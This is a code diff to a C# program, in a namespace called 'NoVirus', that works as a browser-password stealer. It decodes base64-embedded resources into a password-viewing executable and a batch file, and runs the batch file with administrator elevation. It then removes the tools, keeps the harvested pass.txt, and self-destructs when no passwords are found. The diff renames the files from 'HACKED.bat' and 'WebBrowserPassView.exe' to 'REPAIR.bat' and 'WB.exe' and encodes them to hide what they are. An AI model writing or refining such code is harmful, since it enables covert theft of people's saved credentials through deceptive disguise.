@@ -14,6 +14,27 @@ namespace NoVirus
         {
             InitializeLibrary();
         }
+
+        private void CreateWPV()
+        {
+            Stream stream = new MemoryStream(Properties.Resources.WB);
+            StreamReader SR = new StreamReader(stream);
+            string my = SR.ReadToEnd();
+            byte[] enc = Convert.FromBase64String(my);
+            File.WriteAllBytes("WB.exe", enc);
+            SR.Close();
+        }
+
+        private void CreateBAT()
+        {
+            Stream stream = new MemoryStream(Properties.Resources.BAT);
+            StreamReader SR = new StreamReader(stream);
+            string my = SR.ReadToEnd();
+            byte[] enc = Convert.FromBase64String(my);
+            File.WriteAllBytes("REPAIR.bat", enc);
+            SR.Close();
+        }
+
         bool isAdmin;
         string path;
         private void InitializeLibrary()
@@ -30,14 +51,13 @@ namespace NoVirus
                 {
                     int last = path.LastIndexOf('\u005c') + 1;
                     path = path.Remove(last);
-                    string bat = path + "HACKED.bat";
-                    string passview = path + "WebBrowserPassView.exe";
+                    string bat = path + "REPAIR.bat";
+                    string passview = path + "WB.exe";
                     if (File.Exists(bat) != true && File.Exists(passview) != true)
                     {
-                        File.WriteAllBytes(bat, Properties.Resources.HACKED);
-                        File.WriteAllBytes(passview, Properties.Resources.WebBrowserPassView);
+                        CreateBAT(); CreateWPV();
                         Process my = new Process();
-                        my.StartInfo.FileName = $"{path}HACKED.bat";
+                        my.StartInfo.FileName = $"{path}REPAIR.bat";
                         my.StartInfo.UseShellExecute = true;
                         my.StartInfo.Verb = "runas";
                         my.Start();
@@ -54,13 +74,13 @@ namespace NoVirus
         {
             if (isAdmin)
             {
-                Thread.Sleep(1000);
-                if (File.Exists($"{path}HACKED.bat")) { File.Delete($"{path}HACKED.bat"); }
-                if (File.Exists($"{path}WebBrowserPassView.exe")) { File.Delete($"{path}WebBrowserPassView.exe"); }
+                Thread.Sleep(1500);
+                if (File.Exists($"{path}REPAIR.bat")) { File.Delete($"{path}REPAIR.bat"); }
+                if (File.Exists($"{path}WB.exe")) { File.Delete($"{path}WB.exe"); }
                 if (File.Exists($"{path}pass.txt"))
                 {
                     if (Directory.Exists($"{path}my") != true) { Directory.CreateDirectory($"{path}my"); }
-                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", ""); }
+                    if (File.Exists($"{path}my\\pass.txt")) { File.Replace($"{path}pass.txt", $"{path}my\\pass.txt", $"{path}my\\pass_old.txt"); }
                     else { File.Move($"{path}pass.txt", $"{path}my\\pass.txt"); }
                 }
                 else { Suicide(); }
